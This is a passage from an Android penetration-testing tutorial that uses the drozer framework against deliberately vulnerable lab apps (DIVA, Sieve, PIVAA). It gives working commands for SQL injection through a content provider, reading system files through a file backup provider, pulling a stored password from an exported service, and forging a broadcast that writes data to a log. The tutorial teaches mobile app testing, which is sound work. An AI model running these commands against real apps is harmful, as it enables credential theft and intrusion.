+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run scanner.provider.sqltables -a jakhar.aseem.diva
+run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "*" --selection "1 or 1=1"</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-khmOpX6abY8/X-XzYwKHW8I/AAAAAAAAsGE/vW5kAGAMqqgpN8jFA4Wcoue9gSECc8F1QCLcBGAsYHQ/s16000/Screenshot_31.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, this demonstration was about database-backed content providers. Let’s see another case of a content provider where the application is working with files, instead of an SQLite database. The code would be the same, except we won’t need selection, projection arguments for this.</span></p>
+<p><span style="color: #000000;">In the sieve app, for example, we have a file backup provider that backs up various files from the storage. Now, if an attacker was to use this provider’s interface to view internal system files, it would be a critical vulnerability. In the following command, the same has been demonstrated:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-AZtckTOiKcM/X-X0RqMr5YI/AAAAAAAAsGY/u8nXN4Lbqyo5pJLlWDtNmkN1Eq8rv20gwCLcBGAsYHQ/s16000/Screenshot_32.png" alt="Android Penetration Testing with Drozer" width="831" height="71"/></span></p>
+<p><span style="color: #000000;"><strong>Mitigation: </strong>One possible mitigation for this security threat is not to use files using content providers but use a subclass called <strong>File <span style="color: #000000;">Provider</span></strong>. You can read more about its implementation <strong><span style="color: #0000ff;"><u><a style="color: #0000ff;" href="https://developer.android.com/reference/androidx/core/content/FileProvider">here</a></u>.</span></strong></span></p>
+<h3><span style="color: #800000;">Exploiting Services</span></h3>
+<p><span style="color: #000000;">Services are often used to run code inside an application that is important to keep running, even when the application is not in the foreground. Now, there is something called a bound service. They provide a mechanism for applications on a device to interconnect directly with each other using remote procedure calls (RPCs). An application can implement a bound service in three ways:</span></p>
+<ul>
+<li><span style="color: #000000;">Extending the Binder class</span></li>
+<li><span style="color: #000000;">Using a messenger</span></li>
+<li><span style="color: #000000;">Using AIDL</span></li>
+</ul>
+<p><span style="color: #000000;">Implementation of AIDL is particularly difficult and complex (although, recommended) so most of the developers rely on using a messenger.  These messages are defined by the Message class. As part of a Message object, a “message code,” which is defined as the what variable, is specified and compared against predefined values in the class’s handler code to perform different actions according to this value. Sending arbitrary objects inside the Message object that can be used by the receiving code is also possible. However, there is no direct interaction with methods when using this technique.</span></p>
+<h5><span style="color: #000000;">Exploiting AuthService in Sieve App</span></h5>
+<p><span style="color: #000000;">For example, in sieve app we see a messenger service being implemented in the AuthService class.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eAjp56zBSd8/X-X0VxDs4iI/AAAAAAAAsGc/rE25A4kwm1M-iY0Qnn1ky_yDWtewwrzbwCLcBGAsYHQ/s16000/Screenshot_33.png"/></span></p>
+<p><span style="color: #000000;">Here, “message.what” is implemented using the check code of 2354 and an argument “arg1” that has a code 9234 that returns a password. Now, we’ll exploit this and return a password associated with a dedicated pin:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.service.info -a com.mwr.example.sieve</pre>
+<p><span style="color: #000000;">This would return information on all the exported services</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 8080 --bundle-as-obj</pre>
+<p><span style="color: #000000;">–msg has to have 3 parameters. If the code doesn’t have 3 parameters and has only 1, you can add 1 and 2 as 2nd and 3rd parameter in the command, and similarly, like in this case, msg has only 2 parameters so we’ve added 1 as the third parameter. Message implementation also has an extra parameter in the code that refers to the pin. Bundle as the object is used where the data is likely to be stored in an object and so, will be displayed as an object only.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-2cRDUutcsB8/X-X0aEn6ldI/AAAAAAAAsGg/dK3lJrx0dbwLUOGdC0T03A6x4y0_E8XMgCLcBGAsYHQ/s16000/Screenshot_34.png" alt="Android Penetration Testing with Drozer" width="550" height="367"/></span></p>
+<p><span style="color: #000000;">And we can see that the password with the pin 8080 is now returned. Any other msg arguments would simply force the module to return garbage value.</span></p>
+<p><span style="color: #000000;">The above demonstration is one example of exploiting services. We can also exploit service by creating a custom APK, invoking vulnerable service in an existing application and reading from that service in our own app. One example could be stealing a user’s location from an application that is exporting location service. We’d cover exploiting services in detail in further articles.</span></p>
+<h3><span style="color: #800000;"><strong>Exploiting Broadcast Receivers</strong></span></h3>
+<p><span style="color: #000000;">For this demonstration, we’ll be using an application called pivaa. The download link is available in the introduction. It’s created by HTBridge. Let’s run a quick package scan first</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.package.list -f pivaa</pre>
+<p><span style="color: #000000;">Now, to display information about an installed application’s exported broadcast receivers we run the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.broadcast.info -a com.htbridge.pivaa</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-m6KV2F5wS5s/X-X0eDTOTMI/AAAAAAAAsGo/4P-2iNTtwX4hw7f0CNdgHFbNe3McPG-qwCLcBGAsYHQ/s16000/Screenshot_35.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, we see an exported receiver. On inspecting its source code we can see that the broadcast is being sent with data and location parameters and the data is being written in a log file in the storage.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RcA6iTtFB6M/X-X0h61ksiI/AAAAAAAAsGs/uk11Zx4nB7kL4fuADWfM1zkvfoYK4izPwCLcBGAsYHQ/s16000/Screenshot_36.png"/></span></p>
+<p><span style="color: #000000;"><strong>Note: Now, to perform the next experiment we suggest you do these on an older version of android. Recent versions (Android Oreo +) are not allowing these attacks to be successful.</strong></span></p>
+<p><span style="color: #000000;">With that being said, we’ll now run the following command to invoke vulnerable receiver so-named “service.vulnerable.vulnerableservice.LOG” that is mentioned in the code above with location and data and see if the receiver actually writes our custom data in the log file or not.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.broadcast.send --action service.vulnerable.vulnerableservice.LOG --extra string data "Hacking" --extra string location "/tmp/note.txt"</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-ryJf6ydab20/X-X0lv2cSWI/AAAAAAAAsG0/OgeExk-qJRI7B8-ZBn-H4gGo7LdWsIPwACLcBGAsYHQ/s16000/Screenshot_37.png" alt="Android Penetration Testing with Drozer" width="612" height="116"/></span></p>
+<p><span style="color: #000000;">Now, note.txt in the /tmp directory is a file that I had created just before running the above command. Let’s first run logcat and see what had happened when I typed in the above command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">adb logcat | grep htbridge</pre>
+<p><span style="color: #000000;">Sure enough, we see that the app has recently accessed the location /tmp/note.txt</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-YAp7a9GsC2w/X-X0p-fLVKI/AAAAAAAAsG4/e3yVV7654-wzf-SR0RymYADDXnkX91N7ACLcBGAsYHQ/s16000/Screenshot_38.png"/></strong></span></p>
+<p><span style="color: #000000;">Let’s see what data was written in the log file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">adb shell
+cd /tmp
+cat note.txt</pre>
+<p><span style="color: #000000;"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-jQroxVuJoKQ/X-X0v8J6UoI/AAAAAAAAsG8/wV_tJNqjQ24WClg-fv1iSWYWb4i-6UvTwCLcBGAsYHQ/s16000/Screenshot_39.png" alt="Android Penetration Testing with Drozer" width="531" height="105"/></strong></span></p>
+<p><span style="color: #000000;">As we can see, the vulnerable receiver has received our forged command and written my custom data in its log file. Now, we can exploit this vulnerability by inputting malicious payload here.</span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">In this article, we saw various use cases of drozer framework and used three vulnerable android apps to demonstrate various attacks that pose a serious security threat to these applications. We explored the attack surface, four different components of the application, performed SQL injection etc. In the next article, we’ll have a look at a great automated tool that can perform all of these checks within minutes and perhaps more. Thanks for reading.</span></p>
+<p><span style="color: #000000;">To learn more about Android Penetration Testing. Follow this <strong><a href="https://www.hackingarticles.in/category/android-penetration-testing/">Link.</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact<strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
